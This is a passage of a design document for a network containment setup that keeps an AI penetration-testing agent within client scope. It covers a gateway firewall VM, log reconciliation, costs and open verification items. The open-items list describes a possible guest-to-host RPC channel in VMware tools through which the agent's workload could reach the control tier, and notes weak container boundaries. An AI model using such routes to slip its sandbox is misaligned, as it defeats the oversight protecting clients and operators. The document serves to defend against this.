   client-facing description does not change. What changes is that its failures are now caught by a
   layer below it rather than being the last word.

### The sentence the operator is entitled to say

Once — and only once — `rg-gw` is enforcing, `rg-work` is a disposable clone with no route except
through it, and `rg-reconcile` has run clean on at least one real engagement:

> "Network traffic from the testing environment is filtered by a firewall running on a separate
> machine that the testing environment has no account or access path to. Traffic to destinations
> outside your authorised scope is dropped there, whatever command the agent runs and however it is
> constructed — the agent's cooperation is not required. Every blocked destination is logged outside
> the testing environment and reconciled against the agent's own decisions at engagement close. Two
> limits you should know: the agent's connection to its model provider necessarily stays open, and
> where your systems share an IP address with other tenants the filter is coarser than your scope.
> This bounds what can be reached; it is not a proof of impossibility."

That is materially stronger than the current claim and it is defensible sentence by sentence.
Until every clause is true in the specific engagement being discussed, the claim stays
**"out-of-scope targets are refused by tooling and logged"** (§9.9). In particular, do not say the
first sentence while the gateway is a container on the same kernel — that would be the exact
overstatement §9.3.1 says is worse than having no control at all.

---

## 7. Cost and setup

Property 6 is a real constraint, so here are honest numbers rather than encouraging ones.

### One-time build

| Item | Estimate | Confidence |
|---|---|---|
| Fusion custom vmnet (NAT/DHCP off), `rg-gw` install, two NICs, routing | 2–3 h | Med |
| `nftables.conf` generator from `scope.yaml` + tests | 4–6 h | Med |
| Unbound static-table generator + tests | 2 h | Med |
| CONNECT proxy with hostname allowlist + logging | 2–3 h | Med |
| `ulogd2` NFLOG → §9.11 envelope normaliser | 3–4 h | Low — the fiddliest piece |
| `scope_guard.py` emits `scope.allow` with `resolved_ips` + `corr_id` | 2–3 h | High |
| `rg-reconcile` + tests + fault injection in `verify_controls.py` | 4–6 h | Med |
| `rg-work` template: non-sudo user, root-owned hooks, rootless podman, no credentials | 3–4 h | Med |
| `rg-provision` / `rg-teardown` wrappers around `vmrun` | 3–4 h | Med |
| End-to-end validation against a host you own | 3–4 h | Med |

**Total: roughly 4–5 focused days.** Not an afternoon. Anyone quoting less has not written the ulogd
normaliser. Build it in the order listed — the `scope.allow` emission and the reconciler are useful
on their own and are the cheapest real improvement in the list.

### Per engagement, once built

| Step | Time |
|---|---|
| `vmrun clone` (linked clone from template) | ~20 s |
| Resolve scope hostnames, generate + push ruleset, `nft -f` | ~10 s |
| Boot `rg-work`, stage inbound, snapshot `clean` | ~60 s |
| Dedicated Console workspace + API key + spend cap (UI, no Admin API) | ~2 min manual |
| **Total** | **≈ 3–4 minutes, ~2 of them human** |
| Mid-engagement scope amendment | < 1 min machine + operator decision time |
| Teardown: pull evidence, run `rg-reconcile`, `revertToSnapshot`, revoke key | ~2 min |

### Standing cost

- **Licensing: $0.** VMware Fusion Pro has been free for commercial, educational and personal use
  since November 2024, with no license key required
  ([Broadcom/VMware announcement](https://blogs.vmware.com/cloud-foundation/2024/11/11/vmware-fusion-and-workstation-are-now-free-for-all-users/),
  [Broadcom KB 368667](https://knowledge.broadcom.com/external/article/368667/download-and-license-vmware-desktop-hype.html)).
  Free users get documentation and community support only, not Global Support.
- **RAM: ~768 MB standing for `rg-gw`** (sizing estimate, no stated basis beyond a round number —
  `[VERIFY]`), plus whatever `rg-work` needs (4–6 GB during an engagement). This section previously
  treated the three-VM topology as additive to the operator's existing environment. It is not: the
  operator's current Kali guest — the one this research was written on — already reports **9.7 GiB**
  of total RAM allocated, standing, whether or not an engagement is running. On a 16 GB Mac,
  10 (existing guest) + 0.75 (`rg-gw`) + 5 (`rg-work`) ≈ 16 GB before macOS itself takes anything,
  which does not fit. `[VERIFY] total RAM on the Mac` — but the practical conclusion does not wait on
  that number: **the topology is replace-not-add.** The likely shape is that `rg-work` and the
  operator's daily working guest have to be the same VM slot, not two coexisting VMs, which means
  the operator's daily environment cannot simply live inside the disposable, snapshot-reverted
  `rg-work` template as currently specced (§4) — provisioning `rg-work` and provisioning the
  operator's workstation become the same decision, not two. "Shrink or shut down the workstation VM
  during engagements" undersells this: if the workstation VM *is* the slot `rg-work` needs, shutting
  it down mid-session means shutting down the environment this research is being written in. This is
  the most likely practical obstacle to adoption and should be checked, and the topology re-planned
  around it, before any code is written.
- **Disk: ~40 GB** for the `rg-work` template; linked clones add little.
- **Cognitive: one extra `vmrun` command and one habit** — never run the agent on the workstation VM.

---

## 8. Open items marked `[VERIFY]`

Ordered by how much they would change the recommendation.

1. **`[VERIFY]` Total RAM on the Mac host.** Determines whether the three-VM topology is feasible at
   all, and the working guest already accounts for 9.7 GiB of it standing — see §7. Assume
   replace-not-add until this number comes back, and re-rank the no-second-VM (macOS `pf`) variant
   in §4/§9 if it is 16 GB. Check before building.
2. **`open-vm-tools` / VMware guest RPC exposure guest→host on `rg-work` — live, not theoretical.**
   This guest already has `open-vm-tools 2:12.5.0-2` (arm64) and `open-vm-tools-desktop` installed,
   with `vmware-toolbox-cmd` and `vmtoolsd` on PATH and a command surface that includes `gueststore`
   (guest-initiated fetch from a host-side store) and `upgrade` (guest-initiated tools upgrade driven
   by the host) — both guest→host channels on their face, confirmed present, not hypothetical. What
   remains `[VERIFY]` is narrower: whether `vmtoolsd` honours RPC from an unprivileged, non-sudo user
   (`vmware-rpctool 'info-get guestinfo.x'` as such a user) and what the `isolation.tools.*` `.vmx`
   keys can disable from the host side. If the workload can drive host-side operations through this
   channel, that is a path from `rg-work` to the control tier and `open-vm-tools` needs to be
   stripped from the `rg-work` template — with the knock-on loss of shared folders, clipboard and
   time sync that §4 currently assumes. Named in §4.6; this is the first thing to test and the most
   likely hole in the design.
3. **`[VERIFY]` Whether `api.anthropic.com` resolves within the published `160.79.104.0/23` range or
   to Cloudflare anycast.** The published CIDRs are primary-sourced; the Cloudflare claim is
   community reporting. Resolve it before writing an IP-based rule. The CONNECT-proxy design is
   deliberately independent of the answer.
4. **`[VERIFY]` The RedGold toolchain under gVisor `runsc`** — `ffuf`, `nuclei`, `sqlmap`, `httpx`
   with `--net-raw=false`. Determines whether gVisor is a free win or a functional regression.
   gVisor is optional; the boundary does not depend on it.
5. **`[VERIFY]` `pf` on macOS filtering Fusion vmnet traffic pre-NAT.** Only needed if the operator
   takes the no-gateway-VM variant. Sourced only from community posts today.
6. **`[VERIFY]` The OCSF class for security-testing activity**, still outstanding from §9.11 and
   unchanged by this document.

---

## 9. Corrections to §9.10

Three, to be folded into the spec when this is accepted:

1. The candidate table's row "gVisor / Kata / Firecracker microVM — stronger kernel isolation — more
   moving parts" is wrong for this host. Kata and Firecracker are **unavailable** (no KVM, no nested
   virtualisation on Apple Silicon Fusion). gVisor is available and is a different kind of thing
   from the other two: it reduces syscall surface, it does not provide a filtering principal, and it
   is never an answer to property 1.
2. "Container workload + gateway sidecar, no `CAP_NET_ADMIN` — Boundary: Namespace — Weaker; kernel
   shared with the filter" understates the problem. The decisive issue is not the shared kernel; it
   is that the filtering principal is a user the workload can become. Under `hiranya`, who is in
   group `sudo`, this configuration provides **no boundary**, not a weak one.
3. "Kali VM + macOS `pf` on the host controlling NAT — Cheapest for the current setup" is correct
   and should be promoted from a candidate to the documented fallback, with its property-3 and
   property-4 weaknesses recorded.

---

## Sources

- [runc advisory GHSA-9493-h29p-rfm2 (CVE-2025-31133)](https://github.com/opencontainers/runc/security/advisories/GHSA-9493-h29p-rfm2)
- [Sysdig — runc container escape vulnerabilities](https://www.sysdig.com/blog/runc-container-escape-vulnerabilities)
- [CNCF — runc container breakout vulnerabilities: a technical overview](https://www.cncf.io/blog/2025/11/28/runc-container-breakout-vulnerabilities-a-technical-overview/)
- [gVisor install docs (x86_64 and ARM64, Linux 5.6+)](https://github.com/google/gvisor/blob/master/g3doc/user_guide/install.md)
- [gVisor platform guide (systrap, KVM, ptrace)](https://github.com/google/gvisor/blob/master/g3doc/architecture_guide/platforms.md)
- [gVisor FAQ — supported CPU architectures](https://github.com/google/gvisor/blob/master/g3doc/user_guide/FAQ.md)
- [gVisor networking — netstack](https://github.com/google/gvisor/blob/master/g3doc/user_guide/networking.md)
- [runsc flags — `--net-raw`, `--allow-packet-socket-write`](https://github.com/google/gvisor/blob/master/runsc/config/flags.go)
- [Firecracker README — supported platforms](https://github.com/firecracker-microvm/firecracker)
- [Firecracker getting started — requires /dev/kvm](https://github.com/firecracker-microvm/firecracker/blob/main/docs/getting-started.md)
- [podman-run(1)](https://docs.podman.io/en/latest/markdown/podman-run.1.html)
- [Anthropic — IP addresses](https://platform.claude.com/docs/en/api/ip-addresses)
- [Anthropic — Workspaces](https://platform.claude.com/docs/en/manage-claude/workspaces)
- [Anthropic — Rate limits](https://platform.claude.com/docs/en/api/rate-limits)
- [anthropics/claude-code — .devcontainer/init-firewall.sh](https://github.com/anthropics/claude-code/blob/main/.devcontainer/init-firewall.sh)
- [nftables wiki — Logging traffic](https://wiki.nftables.org/wiki-nftables/index.php/Logging_traffic)
- [Netfilter logging framework and nftables (Regit)](https://home.regit.org/2014/02/nftables-and-netfilter-logging-framework/)
- [VMware Communities — nested virtualisation on Apple Silicon](https://communities.vmware.com/t5/VMware-Fusion-Discussions/Attempting-to-do-nested-virtualization/td-p/2308242)
- [VMware — Fusion and Workstation now free for all users](https://blogs.vmware.com/cloud-foundation/2024/11/11/vmware-fusion-and-workstation-are-now-free-for-all-users/)
- [Broadcom KB 368667 — Download and license VMware Desktop Hypervisor](https://knowledge.broadcom.com/external/article/368667/download-and-license-vmware-desktop-hype.html)
- [Atomic Object — Customizing VMware Fusion virtual networks](https://spin.atomicobject.com/vmware-fusion-custom-virtual-networks/) (community source)

Local environment facts in §0 were read directly from this host on 2026-08-20:
`systemd-detect-virt` → `vmware`; `/sys/class/dmi/id/sys_vendor` → `VMware, Inc.`;
`product_name` → `VMware20,1`; `/proc/cpuinfo` CPU implementer `0x61`; `/dev/kvm` absent;
`getconf PAGESIZE` → 4096; `id` shows `hiranya` in group `sudo`;
`apt-cache policy` → podman 5.8.3, docker.io 28.5.2, passt, ulogd2 2.0.9, nftables 1.1.6 (installed),
mitmproxy 12.2.2 (installed).
